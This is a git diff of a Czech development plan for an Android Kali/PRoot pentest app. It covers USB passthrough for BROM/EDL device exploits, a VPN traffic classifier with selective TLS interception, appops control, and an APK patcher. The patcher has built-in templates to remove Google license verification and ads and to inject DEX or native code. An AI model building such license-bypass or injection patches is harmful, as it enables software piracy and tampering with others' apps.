@@ -1,502 +1,790 @@
-``` - [√] **Konfigurace Intent Filtru pro Activity:** Zajistit, aby se aplikace probudila nebo nabídla otevření hned po 
-zasunutí kabelu: ```xml <intent-filter>
-    <action android:name="android.hardware.usb.action.USB_DEVICE_ATTACHED" /> </intent-filter> <meta-data
-    android:name="android.hardware.usb.action.USB_DEVICE_ATTACHED"
-    android:resource="@xml/usb_device_filter" />
+# 🐉 NetHunter AI Operator — Inspirační a Rozvojový Plán
 
-```
- * [√] **Vytvoření res/xml/usb_device_filter.xml:**
-   Definovat filtry pro konkrétní čipy (např. MediaTek BROM, Qualcomm EDL - s obecnými nebo prázdnými ID pro zachycení všeho):
-   ```xml
-   <?xml version="1.0" encoding="utf-8"?>
-   <resources>
-       <usb-device />
-   </resources>
-   
-   ```
-## Fáze 2: Životní cyklus USB a zachycení File Descriptoru
-**Cíl:** Získat od uživatele oprávnění k hardwaru a vytáhnout surový linuxový int souborový deskriptor (fd), se kterým umí pracovat C knihovny.
- * [√] **Implementace Broadcast Receiveru pro runtime permission:**
-   ```java
-   private static final String ACTION_USB_PERMISSION = "com.linux_core.USB_PERMISSION";
-   private final BroadcastReceiver usbReceiver = new BroadcastReceiver() {
-       public void onReceive(Context context, Intent intent) {
-           String action = intent.getAction();
-           if (ACTION_USB_PERMISSION.equals(action)) {
-               synchronized (this) {
-                   UsbDevice device = (UsbDevice)intent.getParcelableExtra(UsbManager.EXTRA_DEVICE);
-                   if (intent.getBooleanExtra(UsbManager.EXTRA_PERMISSION_GRANTED, false)) {
-                       if(device != null) {
-                           // Krok 2.2: Otevření zařízení
-                           extractFileDescriptor(device);
-                       }
-                   }
-               }
-           }
-       }
-   };
-   
-   ```
- * [ ] **Vyžádání oprávnění:**
-   Pokud zařízení nemá perms, vyvolat systémové okno:
-   ```java
-   UsbManager manager = (UsbManager) getSystemService(Context.USB_SERVICE);
-   PendingIntent permissionIntent = PendingIntent.getBroadcast(this, 0, new Intent(ACTION_USB_PERMISSION), PendingIntent.FLAG_MUTABLE);
-   manager.requestPermission(device, permissionIntent);
-   
-   ```
- * [ ] **Surová extrakce FD:**
-   ```java
-   private void extractFileDescriptor(UsbDevice device) {
-       UsbDeviceConnection connection = manager.openDevice(device);
-       if (connection != null) {
-           int fd = connection.getFileDescriptor();
-           // Tento int 'fd' je klíč k nízkoúrovňové komunikaci!
-           sendFdToPRoot(fd);
-       }
-   }
-   
-   ```
-## Fáze 3: Most do PRootu (Předání FD do sandboxu)
-**Cíl:** Protokol PRoot standardně izoluje souborový systém, takže /dev/bus/usb/ je prázdný. Musíme předat otevřený FD dovnitř běžícího Linuxu.
- * [x] **Varianta A: Předání jako argument při startu (Pokud se zařízení připojuje před startem Kali):**
-   Předat FD přímo do environment proměnné nebo skriptu:
-   ```bash
-   proot -r ./rootfs -b /dev -b /proc --env=PASSTHROUGH_USB_FD=3 ...
-   
-   ```
- * [√] **Varianta B: Přenos za běhu přes Unix Domain Socket (Doporučeno):**
-   V aplikaci na straně Androidu vytvořit LocalServerSocket. Uvnitř PRootu se skript připojí na tento socket a Android aplikace mu pomocí metody AncillaryData (odpovídá Linuxovému SCM_RIGHTS) pošle zduplikovaný FD přímo do běžícího Python/C procesu.
-## Fáze 4: Nativní C/Python implementace v Kali Linuxu
-**Cíl:** Přinutit nástroje v Kali (např. exploity, skripty, libusb), aby se nepokoušely prohledávat /dev/bus/usb/, ale rovnou adoptovaly náš FD.
- * [√] **Úprava libusb inicializace (Kompilace vlastní verze pro Kali):**
-   Standardní libusb_open_device_with_vid_pid selže. Je nutné v kódu zneužít neoficiální/přidanou funkci v libusb:
-   ```c
-   // Vytvoření libusb device handle přímo ze souborového deskriptoru, který prošel z Javy
-   libusb_device_handle *handle = NULL;
-   libusb_wrap_sys_device(ctx, (intptr_t)passed_fd, &handle);
-   
-   ```
- * [√] **Injekce do Pythonu (PyUSB wrapper):**
-   Pokud tvůj exploit/skript běží v Pythonu, vytvořit C-extension wrapper, který zavolá libusb_wrap_sys_device na předaném čísle FD a vrátí instanci objektu, se kterým už PyUSB dokáže posílat nízkoúrovňové control_transfer nebo bulk zápisy/čtení (vhodné pro BROM/EDL manipulaci).
-
-
-
-## vytvorit XFCE jako Android Launcher a mit tak dostupny plnohodnotne linux env s aplikacemi androidu  🧪 (EXPERIMENTALNÍ)
-**Cíl:** Vytvořit finální grafické rozhraní (Launcher), které po stisknutí tlačítka Home nahradí systémovou plochu a zprostředkuje UI pro Kali i Android aplikace.
- * [ ] **Registrace jako Home Screen (AndroidManifest.xml):**
-   ```xml
-   <activity android:name=".LauncherActivity" android:launchMode="singleInstance">
-       <intent-filter>
-           <action android:name="android.intent.action.MAIN" />
-           <category android:name="android.intent.category.HOME" />
-           <category android:name="android.intent.category.DEFAULT" />
-       </intent-filter>
-   </activity>
-   
-   ```
- * [ ] **Vykreslení XFCE Desktopu:**
-   V LauncherActivity inicializovat vestavěné VNC View (např. založené na bVNC core). Toto okno zabere 70-80 % obrazovky a bude zobrazovat běžící instanci VS Code / Terminálu z Kali PRootu.
- * [ ] **Tvorba Android App Drawer / Sidebar:**
-   Vytvořit postranní vysouvací panel v launcheru. Načíst aplikace ze systému:
-   ```java
-   PackageManager pm = getPackageManager();
-   Intent mainIntent = new Intent(Intent.ACTION_MAIN, null);
-   mainIntent.addCategory(Intent.CATEGORY_LAUNCHER);
-   List<ResolveInfo> pkgAppsList = pm.queryIntentActivities(mainIntent, 0);
-   
-   ```
- * [ ] **Spouštění v režimu Freeform / Plovoucích oken (MIUI/HyperOS):**
-   Když v launcheru klikneš na ikonu Android aplikace, launcher ji vynutí otevřít jako překryvné okno nad běžícím Kali Linuxem:
-   ```java
-   Intent intent = pm.getLaunchIntentForPackage(resolvedApp.activityInfo.packageName);
-   ActivityOptions options = ActivityOptions.makeBasic();
-   try {
-       // Využití skrytých/Freeform metod (podporováno na Xiaomi zařízeních)
-       Method setLaunchWindowingMode = ActivityOptions.class.getMethod("setLaunchWindowingMode", int.class);
-       setLaunchWindowingMode.invoke(options, 5); // 5 je standardně WINDOWING_MODE_FREEFORM
-   } catch (Exception e) {
-       intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-   }
-   startActivity(intent, options.toBundle());
-   
-   ```
-```
-
-[file-tag: code-generated-file-0-1782602153097065077]
-
-### Klíčové body, které plán řeší:
-
-1. **USB Passthrough bez Rootu:** Ukazuje přesný postup od zachycení zařízení v Android Manifestu (`usb_device_filter.xml`) přes vyžádání runtime oprávnění až po magický moment v Javě – vytáhnutí surového `int fd = connection.getFileDescriptor();`.
-2. **Most do PRoot sandboxu:** Jak tenhle souborový deskriptor protlačit skrz izolaci PRootu. Popisuje metodu předání za běhu pomocí Unix Domain Socketu (`SCM_RIGHTS`), což ti umožní připojovat zařízení dynamically bez nutnosti restartovat celý linuxový kontejner.
-3. **Nativní adopce (C/Python v Kali):** Jak přinutit nízkoúrovňové exploity nebo PyUSB, aby namísto prohledávání prázdného `/dev/bus/usb/` adoptovaly tento deskriptor pomocí funkce `libusb_wrap_sys_device`.
-4. **Experimentální Launcher:** Kompletní návod na registraci aplikace jako `android.intent.category.HOME`. Obsahuje kód pro načtení nainstalovaných aplikací ze systému do sidebaru a hlavně trik s reflexí (`setLaunchWindowingMode`), který na HyperOS/MIUI vynutí spuštění Android aplikací ve Freeform plovoucích oknech přímo nad tvým běžícím Linux GUI desktopem.
-
-```
+> Dokument vznikl reverzní analýzou relevantních APK (Canta, HappyMod, Lucky Patcher)
+> a aplikací jejich zkušeností na NetHunter AI Operator (`com.linux_core`).
+>
+> **Cíl:** Podrobný seznam inspirací, architektur a konkrétních implementačních kroků
+> pro další vývoj aplikace.
 
 ---
 
+## 📊 APK Zdroje Inspirace
 
-# VPN AI Brain — Kompletní implementační plán
-## Smart Traffic Decision System + Phoenix Telemetrie
-
-> Tento dokument slouží jako jediný zdroj pravdy pro implementaci. Lze ho vložit
-> jako prompt/kontext pro AI coding agenta (picoding) při postupné realizaci.
-
----
-
-## 0. Kontext projektu
-
-- **Aplikace:** NetHunter AI Operator (`com.linux_core`), Android, PRoot Kali/Parrot
-- **Existující komponenty využité tímto plánem:**
-  - `AIBrain.kt` — ONNX klasifikátor síťových flow (size, entropie, timing)
-  - `TlsMitmEngine.kt` / `RootCaInstaller.createCaptureOnlySslContext()` — selektivní capture-only MITM
-  - `OffensiveEngine.kt` — vzor notifikace s Allow/Deny + 30s timeout (fail-safe = Deny)
-  - `LocalApiServer.kt` (port 1337) — Bearer token auth, sem přibudou nové endpointy
-  - `ai-agent.py` (port 13338) — ReAct agent, sem přibudou nové tool-cally
-  - Existující Phoenix instance (localhost:6006) používaná pro picoding agenta — **znovupoužít**, ne duplikovat
-- **Bezpečnostní rámec:** navazuje na `SECURITY_AUDIT.md` — fail-safe defaults, žádné nové neautentizované endpointy, žádné globální MITM zapnutí bez capture-only omezení
+| # | APK | Verze | Klíčová inspirace pro NetHunter |
+|---|-----|-------|---------------------------------|
+| 🎯 | **Canta** (org.samo_lego.canta) | 2.2.2 | Moderní target SDK, permission minimalismus, čistý Compose kód |
+| 📦 | **HappyMod** (com.happymod.apk) | 3.1.4 | Download manager UX, background jobs, boot orchestrace |
+| ⚡ | **Lucky Patcher** (ru.aaaaacah.installer) | 11.4.8 | Deep su workflow, appops management, APK modifikace |
 
 ---
 
-## 1. Architektura (3 rozhodovací vrstvy)
+## 🔴 1. Modernizace Android API (Inspirace: Canta)
 
+### 1.1 Zvednout targetSdk z 28 → 35
+
+**Současný stav:**
 ```
-┌─────────────────────────────────────────────────────────┐
-│ VRSTVA 1: AIBrain.kt (existuje, upravit výstup)          │
-│ → Klasifikace KAŽDÉHO flow → confidence 0.0–1.0           │
-│ → >0.9 nebo <0.1 = rozhoduje sama, žádná eskalace          │
-└─────────────────────────────────────────────────────────┘
-                          │ confidence 0.1–0.9 (nejisté pásmo)
-                          ▼
-┌─────────────────────────────────────────────────────────┐
-│ VRSTVA 2: TrafficAggregator.kt (nový, čistě mechanický)  │
-│ → SQLite dedup/suppress, dávkuje flow po 60–120s oknech    │
-│ → Známé adresy potichu aplikují starý verdikt, bez LLM     │
-└─────────────────────────────────────────────────────────┘
-                          │ jen nové/neznámé adresy, dávkově
-                          ▼
-┌─────────────────────────────────────────────────────────┐
-│ VRSTVA 3: LLM Arbiter (rozšíření ai-agent.py)            │
-│ → Kompaktní JSON vstup, tool-cally, verdikt, notifikace    │
-│ → Telemetrie z KAŽDÉHO rozhodnutí → Phoenix (async, batch) │
-└─────────────────────────────────────────────────────────┘
+minSdk = 28
+targetSdk = 28    ← 7 let staré API!
+compileSdk = 36
 ```
 
-**Analogie:** vrátný (Vrstva 1) → vedoucí ostrahy (Vrstva 2, jen dedup a rozdělování práce) → majitel budovy (Vrstva 3, rozhoduje a učí se). Phoenix je kamerový archiv, do kterého se nahrává záznam z každého rozhodnutí majitele — ne z každého kroku vrátného.
+**Proč je to kritické:**
+- Google Play vyžaduje targetSdk 33+ od 2024
+- Nové bezpečnostní modely (Android 12-15) nejsou aktivovány
+- Uživatelé na Android 14+ vidí warning při instalaci APK
 
----
+**Postup migrace:**
 
-## 2. SQLite schéma (operační paměť, lokální, rychlá)
+| Krok | Co se mění | Soubor |
+|------|------------|--------|
+| 1 | `targetSdk = 34` v `build.gradle.kts` | `app/build.gradle.kts` |
+| 2 | Foreground service typy — přidat `foregroundServiceType` do manifestu | `AndroidManifest.xml` |
+| 3 | Notification channel — přidat `POST_NOTIFICATIONS` runtime permission (Android 13+) | `MainActivity.kt` |
+| 4 | Storage — přechod z `READ_EXTERNAL_STORAGE` na `MediaStore` API | všechny storage přístupy |
+| 5 | AlarmManager — přechod na `SCHEDULE_EXACT_ALARM` nebo `USE_EXACT_ALARM` | if používáte alarmy |
+| 6 | Otestovat VPN service pod novým modelem | `VpnNatEngine.kt` |
 
-```sql
--- Hlavní tabulka známých adres/domén
-CREATE TABLE known_addresses (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    address TEXT NOT NULL UNIQUE,
-    first_seen INTEGER NOT NULL,
-    last_seen INTEGER NOT NULL,
-    occurrence_count INTEGER DEFAULT 1,
-    avg_interval_sec INTEGER,
-    avg_entropy REAL,
-    typical_port INTEGER,
-    verdict TEXT DEFAULT 'unknown',        -- unknown/allowed/blocked/pending_user
-    verdict_source TEXT,                   -- ai_auto/user_confirmed/ai_brain
-    verdict_confidence REAL,
-    notified_user INTEGER DEFAULT 0,
-    notes TEXT,
-    trace_id TEXT                          -- FK na Phoenix span (viz sekce 5)
-);
+**Očekávané problémy:**
+- `VpnService` chování se měnilo v Androidu 12+ (více omezení)
+- `NotificationListenerService` v Android 14+ vyžaduje user grant v nastavení
+- `AccessibilityService` v Android 14+ má omezení (Google bojuje proti zneužití)
+- PRoot potřebuje `MANAGE_EXTERNAL_STORAGE` — to v targetSdk 35 stále funguje
 
--- Denní agregace pro 24h souhrn
-CREATE TABLE daily_stats (
-    date TEXT PRIMARY KEY,
-    total_flows INTEGER,
-    new_addresses INTEGER,
-    blocked_count INTEGER,
-    allowed_count INTEGER,
-    pending_count INTEGER,
-    top_entropy_address TEXT
-);
+### 1.2 Permission Audit (Inspirace: Canta)
 
--- Krátkodobý buffer flow čekajících na dávkové zpracování
-CREATE TABLE pending_flows (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    address TEXT NOT NULL,
-    detected_at INTEGER NOT NULL,
-    brain_confidence REAL,
-    escalated_to_llm INTEGER DEFAULT 0,
-    expires_at INTEGER NOT NULL             -- auto-cleanup po 5 min
-);
-```
+**Canta má 3 permissions. NetHunter má 20+.**
 
-**Klíčový princip:** jakmile `verdict != 'unknown'`, adresa mizí z běžného výpisu (`get_pending_flows()` ji nevrací). LLM ji vidí znovu jen přes explicitní `get_address_history(address)`.
+**Cíl:** Rozdělit permissions do kategorií a oddělit ty, co nejsou potřeba pro core funkcionalitu.
 
----
-
-## 3. Kompaktní JSON formát pro `get_pending_flows()`
-
-```json
-{
-  "pending": [
-    {
-      "a": "185.220.101.4",
-      "n": 6,
-      "iv": 3600,
-      "ent": 0.91,
-      "p": 443,
-      "sni": null,
-      "b_conf": 0.55
+```kotlin
+// build.gradle.kts — rozdělení permissions podle funkcionality
+android {
+    defaultConfig {
+        // CORE — vždy vyžadováno
+        // INTERNET, ACCESS_NETWORK_STATE, FOREGROUND_SERVICE, WAKE_LOCK
+        
+        // VPN — nutné pro VpnService
+        // (žádná extra permission, VpnService je systémová)
+        
+        // HARDWARE — runtime-only, nikdy v instalaci
+        // CAMERA, RECORD_AUDIO, ACCESS_FINE_LOCATION, ACCESS_COARSE_LOCATION
+        
+        // STORAGE — pro PRoot
+        // MANAGE_EXTERNAL_STORAGE (zůstává i v SDK 35)
+        
+        // SPECIAL — oddělit do samostatného modulu
+        // PACKAGE_USAGE_STATS, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
     }
-  ]
 }
 ```
 
-| Klíč | Význam |
-|------|--------|
-| `a` | adresa (IP nebo SNI) |
-| `n` | počet výskytů od prvního zachycení |
-| `iv` | průměrný interval mezi výskyty (s) |
-| `ent` | entropie payloadu (0–1) |
-| `p` | cílový port |
-| `sni` | TLS SNI pokud zachyceno, jinak `null` |
-| `b_conf` | confidence z `AIBrain` |
+**Konkrétní návrh:**
+1. Přesunout `CAMERA`, `RECORD_AUDIO` do runtime žádosti (už to děláte částečně)
+2. `BLUETOOTH` — odstranit, pokud není používán
+3. `ACCESS_BACKGROUND_LOCATION` — vyžadovat jen při aktivním location tracking
+4. `PACKAGE_USAGE_STATS` — oddělit do samostatného modulu "Device Stats"
+5. `READ_PHONE_STATE` — zvážit odstranění (používá se jen pro IMEI?)
 
-Odhad: ~25–30 tokenů/flow → dávka 10 flow ≈ 300 tokenů vstupu. Žádné absolutní timestampy v promptu (zbytečné pro rozhodnutí, zůstávají jen v SQLite).
+### 1.3 Canta-like Shizuku integrace vzor
 
----
+Canta používá Shizuku API čistě a minimalisticky. NetHunter už Shizuku má, ale může se inspirovat architekturou:
 
-## 4. Tool-call rozhraní pro LLM (rozšíření `ai-agent.py`)
-
-| Tool | Vstup | Výstup | Kdy volat |
-|------|-------|--------|-----------|
-| `get_pending_flows()` | — | JSON dávka nových adres (sekce 3) | začátek cyklu |
-| `get_address_history(address)` | adresa | plná historie jen pro 1 adresu | jen při potřebě detailu |
-| `enable_mitm_for_flow(address, duration_sec≤60)` | adresa, doba | capture-only MITM zapnutý selektivně | jen u nejasného flow |
-| `set_verdict(address, verdict, confidence, note)` | allow/block/pending_user | zápis do `known_addresses` + Phoenix span | vždy na konci rozhodování |
-| `notify_user(address, question)` | text otázky | Android notifikace Allow/Deny, timeout 30s | jen když `verdict='pending_user'` |
-| `summarize_24h()` | — | čte jen `daily_stats` | 1×/den, WorkManager cron |
-
-**Symetrický formát odpovědi `set_verdict()`:**
-```json
-{"a": "185.220.101.4", "v": "blocked", "conf": 0.82, "note": "periodic beacon, high entropy, no SNI"}
-```
-
----
-
-## 5. Telemetrie → napojení na existující Phoenix (ne vlastní klon)
-
-### Rozhodnutí a zdůvodnění
-
-Nevytváříme vlastní observabilitu — napojujeme se na **stávající Phoenix instanci** (localhost:6006), kterou už používáš pro picoding agenta. Důvody:
-- Phoenix řeší jen vizualizaci/store traces, ne rozhodovací stav (ten zůstává v SQLite jako zdroj pravdy)
-- SQLite dotaz "má adresa verdikt?" musí být lokální a okamžitý — žádný network round-trip do trace serveru na hot pathu
-- Jednotný přehled obou agentů (coding + VPN) v jednom Phoenix projektu, jen s odlišným `project_name`
-
-**Analogie:** SQLite je provozní deník mistra v kapse, který kouká okamžitě. Phoenix je centrální archiv, kam se deník kopíruje dávkově — pro tebe jako architekta, ne pro běh systému samotného.
-
-### Kdy se odesílá span
-
-**Ne per-packet, ne z hot pathu klasifikace.** Odesílá se výhradně po `set_verdict()` — tedy jednou za rozhodnutí, ne za paket. Batch, asynchronně, mimo hlavní vlákno.
-
-### Minimální OTLP export (bez těžkého OTel SDK)
-
-Python (`ai-agent.py`), žádné závislosti navíc kromě `requests`/`httpx`:
-
-```python
-import time
-import uuid
-import json
-import threading
-import requests
-
-PHOENIX_OTLP_URL = "http://localhost:6006/v1/traces"
-PROJECT_NAME = "vpn_ai_brain"
-
-def _now_ns() -> int:
-    return int(time.time() * 1_000_000_000)
-
-def send_verdict_span(
-    address: str,
-    pending_input: dict,
-    tool_calls: list[dict],
-    verdict: dict,
-    trace_id: str | None = None,
-) -> str:
-    """
-    Odešle jeden span do Phoenixu po dokončení rozhodovacího cyklu.
-    Volat asynchronně (viz _fire_and_forget), aby to neblokovalo ai-agent.py.
-    """
-    trace_id = trace_id or uuid.uuid4().hex
-    span_id = uuid.uuid4().hex[:16]
-    start_ns = _now_ns()
-
-    span = {
-        "resourceSpans": [{
-            "resource": {
-                "attributes": [
-                    {"key": "service.name", "value": {"stringValue": PROJECT_NAME}},
-                ]
-            },
-            "scopeSpans": [{
-                "spans": [{
-                    "traceId": trace_id,
-                    "spanId": span_id,
-                    "name": f"verdict:{address}",
-                    "startTimeUnixNano": str(start_ns),
-                    "endTimeUnixNano": str(_now_ns()),
-                    "attributes": [
-                        {"key": "openinference.span.kind", "value": {"stringValue": "AGENT"}},
-                        {"key": "input.value", "value": {"stringValue": json.dumps(pending_input)}},
-                        {"key": "output.value", "value": {"stringValue": json.dumps(verdict)}},
-                        {"key": "tool_calls", "value": {"stringValue": json.dumps(tool_calls)}},
-                        {"key": "vpn.address", "value": {"stringValue": address}},
-                        {"key": "vpn.verdict", "value": {"stringValue": verdict.get("v", "")}},
-                        {"key": "vpn.confidence", "value": {"doubleValue": verdict.get("conf", 0.0)}},
-                    ],
-                }]
-            }]
-        }]
+```kotlin
+// Vzor z Canta — jak by mohl vypadat Shizuku service v NetHunter
+class NetHunterShizukuService : ShizukuService() {
+    override fun onShizukuConnected() {
+        // Získání UID
+        val uid = Process.myUid()  // shell nebo root
+        
+        if (uid == 0) {
+            Log.i("NetHunter", "⚡ Shizuku: root UID — plný přístup")
+        } else {
+            Log.i("NetHunter", "⚡ Shizuku: shell UID — omezený přístup")
+        }
     }
-
-    try:
-        requests.post(PHOENIX_OTLP_URL, json=span, timeout=3)
-    except Exception as e:
-        # Telemetrie nesmí nikdy shodit rozhodovací smyčku
-        print(f"[phoenix-export] warning: {e}")
-
-    return trace_id
-
-
-def send_verdict_span_async(*args, **kwargs):
-    """Fire-and-forget wrapper, aby export nezdržoval set_verdict()."""
-    threading.Thread(target=send_verdict_span, args=args, kwargs=kwargs, daemon=True).start()
+    
+    fun runPrivilegedCommand(command: String): String {
+        return Shizuku.newProcess(arrayOf("sh", "-c", command), null, null)?.let { process ->
+            process.inputStream.bufferedReader().readText()
+        } ?: "ERROR: Shizuku not available"
+    }
+}
 ```
 
-**Napojení v `set_verdict()` tool handleru:**
-```python
-def set_verdict(address, verdict, confidence, note, pending_input, tool_calls):
-    # 1. zápis do SQLite (known_addresses) — synchronně, je to zdroj pravdy
-    trace_id = write_verdict_to_sqlite(address, verdict, confidence, note)
+---
 
-    # 2. telemetrie do Phoenixu — asynchronně, nikdy neblokuje
-    send_verdict_span_async(
-        address=address,
-        pending_input=pending_input,
-        tool_calls=tool_calls,
-        verdict={"v": verdict, "conf": confidence, "note": note},
-        trace_id=trace_id,
+## 🟡 2. Vylepšení UX a funkcionality (Inspirace: HappyMod)
+
+### 2.1 Download Manager pro Rootfs Image
+
+**Současný stav:**
+- Stahování rootfs image probíhá přes HTTP bez pokročilé UX
+- Žádná progress notifikace
+- Žádné pause/resume
+
+**HappyMod pattern:**
+```kotlin
+// DownloadService.kt — inspirováno HappyMod
+class RootfsDownloadService : Service() {
+    
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        val notification = createDownloadNotification("Stahování Kali rootfs...")
+        startForeground(DOWNLOAD_NOTIFICATION_ID, notification)
+        
+        // Download s progress
+        downloadManager.enqueue(
+            DownloadManager.Request(downloadUri).apply {
+                setTitle("Kali Linux rootfs")
+                setDescription("Stahování...")
+                setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED)
+                setAllowedOverMetered(true)
+                setDestinationInExternalFilesDir(this@RootfsDownloadService, null, "kali-rootfs.tar.xz")
+            }
+        )
+        
+        return START_STICKY
+    }
+    
+    private fun createDownloadNotification(progress: String): Notification {
+        return NotificationCompat.Builder(this, CHANNEL_DOWNLOAD)
+            .setContentTitle("NetHunter AI Operator")
+            .setContentText(progress)
+            .setSmallIcon(R.drawable.ic_download)
+            .setProgress(0, 0, true)  // indeterminate
+            .setOngoing(true)
+            .build()
+    }
+}
+```
+
+**Feature návrh:**
+- [ ] Foreground service s progress notifikací
+- [ ] Možnost zvolit mirror server pro download
+- [ ] Resume po přerušení (ETag / Range headers)
+- [ ] Verifikace checksum (SHA256) po dokončení
+- [ ] Automatická extrakce do PRoot adresáře
+
+### 2.2 Boot Orchestrace a Background Jobs
+
+**HappyMod ukazuje:**
+```xml
+<!-- AndroidManifest.xml recept -->
+<receiver android:name=".BootReceiver">
+    <intent-filter>
+        <action android:name="android.intent.action.BOOT_COMPLETED" />
+    </intent-filter>
+</receiver>
+
+<receiver android:name=".PowerReceiver">
+    <intent-filter>
+        <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
+    </intent-filter>
+</receiver>
+```
+
+**Feature návrh pro NetHunter:**
+- [ ] Boot receiver: pokud byl PRoot spuštěn před restartem → restartovat
+- [ ] Boot receiver: pokud byla VPN aktivní → restartovat
+- [ ] WorkManager job: denní health check rootfs integrity
+- [ ] WorkManager job: denní update AI modelu (AIBrain ONNX)
+- [ ] Power connected: spustit stahování rootfs, pokud čeká
+- [ ] Power connected: update databází (Nmap scripts, Metasploit)
+
+### 2.3 Content Browser pro Nástroje
+
+**HappyMod-like Feature:** Prohlížeč Kali nástrojů přímo v aplikaci.
+
+```kotlin
+// ToolBrowserFeature.kt
+data class KaliTool(
+    val name: String,
+    val category: String,  // Information Gathering, Vulnerability Analysis, etc.
+    val description: String,
+    val isInstalled: Boolean,
+    val installCommand: String,  // apt-get install ...
+    val iconUrl: String?
+)
+
+class ToolBrowserViewModel : ViewModel() {
+    val tools = listOf(
+        KaliTool("nmap", "Information Gathering", "Network exploration tool", false, "apt install nmap", null),
+        KaliTool("metasploit", "Exploitation", "Penetration testing framework", false, "apt install metasploit-framework", null),
+        KaliTool("wireshark", "Sniffing", "Network protocol analyzer", false, "apt install wireshark", null),
+        // ... 600+ nástrojů kategorizovaných
     )
-    return {"a": address, "v": verdict, "conf": confidence, "note": note}
+    
+    fun installTool(tool: KaliTool) {
+        // Spustí apt-get install uvnitř PRoot
+        terminalService.execute("apt-get install -y ${tool.installCommand}")
+    }
+}
 ```
-
-### Co je ve spanu k dispozici pro pozdější trénink
-
-- `input.value` — přesně to, co LLM vidělo (kompaktní JSON dávka)
-- `tool_calls` — sekvence volání (`enable_mitm_for_flow`, `notify_user`) s parametry
-- `output.value` — finální verdikt + confidence + zdůvodnění
-- `vpn.verdict` / `vpn.confidence` — filtrovatelné atributy přímo v Phoenix UI (lze třídit/exportovat jen `user_confirmed` verdikty pro fine-tuning)
 
 ---
 
-## 6. Notifikace uživateli (vzor z `OffensiveEngine`)
+## ⚡ 3. Pokročilé Systémové Funkce (Inspirace: Lucky Patcher)
 
-```
-"Adresa xyz.example.com se ozývá každou hodinu, neobvyklá entropie. Povolit?"
-[Allow] [Deny] — timeout 30s → default Deny (fail-safe)
+### 3.1 appops GUI Manager
+
+**Lucky Patcher umí:** `appops set <package> <op> <mode>`
+
+**NetHunter už má:** CLI přes Shizuku (v terminálu)
+
+**Chybí:** Grafické rozhraní pro správu appops všech aplikací.
+
+```kotlin
+// AppOpsManager.kt
+class AppOpsShizukuManager {
+    
+    /** Získání seznamu všech aplikací s jejich appops */
+    fun getAllPackagesWithOps(): List<AppOpEntry> {
+        val packages = Shizuku.run("pm list packages -3")  // jen user apps
+        return packages.map { pkg ->
+            val ops = Shizuku.run("appops get $pkg")
+            AppOpEntry(pkg, parseOps(ops))
+        }
+    }
+    
+    /** Nastavení konkrétního oprávnění */
+    fun setOp(packageName: String, op: String, mode: String) {
+        // mode: allow, deny, ignore, default
+        Shizuku.run("appops set $packageName $op $mode")
+    }
+    
+    /** Rychlé akce pro pentestery */
+    fun denyAllNotifications(packageName: String) {
+        setOp(packageName, "POST_NOTIFICATIONS", "deny")
+    }
+    
+    fun denyLocation(packageName: String) {
+        setOp(packageName, "ACCESS_FINE_LOCATION", "deny")
+        setOp(packageName, "ACCESS_COARSE_LOCATION", "deny")
+    }
+    
+    fun denyCamera(packageName: String) {
+        setOp(packageName, "CAMERA", "deny")
+    }
+}
 ```
 
-Odpověď uživatele přepíše `verdict_source` na `user_confirmed` — nejvyšší váha, prioritní zdroj pro budoucí fine-tuning nad `ai_auto` verdikty.
+**Feature návrh:**
+- [ ] GUI seznam všech nainstalovaných aplikací (jako Lucky Patcher)
+- [ ] Per-app appops editor (toggle přepínače)
+- [ ] Předvolby: "Social media lockdown", "Banking secure", "Gaming performance"
+- [ ] Quick deny: Camera + Location + Microphone jedním tlačítkem
+- [ ] Historie změn appops
+
+### 3.2 APK Recompilation Engine
+
+**Lucky Patcher core feature:** Modifikace APK (smali patching, license removal, ad removal).
+
+**NetHunter jako pentest nástroj** by to mohl mít jako **killer feature**:
+
+```kotlin
+// ApkPatcher.kt
+class ApkPatcher {
+    
+    /** Fáze 1: Rozbalení APK */
+    fun decompile(apkFile: File): File {
+        // apktool d app.apk -o app_unpacked/
+        Shizuku.run("apktool d ${apkFile.absolutePath} -o ${apkFile.parent}/unpacked/")
+        return File(apkFile.parent, "unpacked/")
+    }
+    
+    /** Fáze 2: Aplikace patchů */
+    fun applyPatches(unpackedDir: File, patches: List<ApkPatch>) {
+        patches.forEach { patch ->
+            when (patch.type) {
+                PatchType.SMALI_REPLACE -> replaceSmaliCode(unpackedDir, patch)
+                PatchType.MANIFEST_EDIT -> editManifest(unpackedDir, patch)
+                PatchType.RESOURCE_REPLACE -> replaceResource(unpackedDir, patch)
+                PatchType.LIB_INJECT -> injectLibrary(unpackedDir, patch)
+                PatchType.DEX_INJECT -> injectDex(unpackedDir, patch)
+            }
+        }
+    }
+    
+    /** Fáze 3: Rekompilace a podepsání */
+    fun recompile(unpackedDir: File, outputApk: File) {
+        // apktool b unpacked/ -o unsigned.apk
+        Shizuku.run("apktool b ${unpackedDir.absolutePath} -o ${outputApk.parent}/unsigned.apk")
+        
+        // jarsigner
+        Shizuku.run("jarsigner -keystore release.jks unsigned.apk releaseKey")
+        
+        // zipalign
+        Shizuku.run("zipalign -v 4 unsigned.apk ${outputApk.absolutePath}")
+    }
+    
+    /** Předpřipravené patch šablony */
+    fun getBuiltinPatches(): List<ApkPatch> {
+        return listOf(
+            ApkPatch("Remove License Verification", PatchType.SMALI_REPLACE, 
+                target = "Lcom/google/android/vending/licensing/LicenseChecker;",
+                replacement = "always return LICENSED"),
+            ApkPatch("Remove All Ads", PatchType.SMALI_REPLACE,
+                target = "Lcom/google/ads/AdView;",
+                replacement = "no-op stub"),
+            ApkPatch("Enable Debug Mode", PatchType.MANIFEST_EDIT,
+                target = "AndroidManifest.xml",
+                replacement = "android:debuggable=\"true\""),
+        )
+    }
+}
+
+enum class PatchType { SMALI_REPLACE, MANIFEST_EDIT, RESOURCE_REPLACE, LIB_INJECT, DEX_INJECT }
+
+data class ApkPatch(
+    val name: String,
+    val type: PatchType,
+    val target: String,
+    val replacement: String
+)
+```
+
+**Feature návrh:**
+- [ ] apktool + jarsigner + zipalign integrace v Termux PRoot
+- [ ] GUI pro výběr APK k patchi
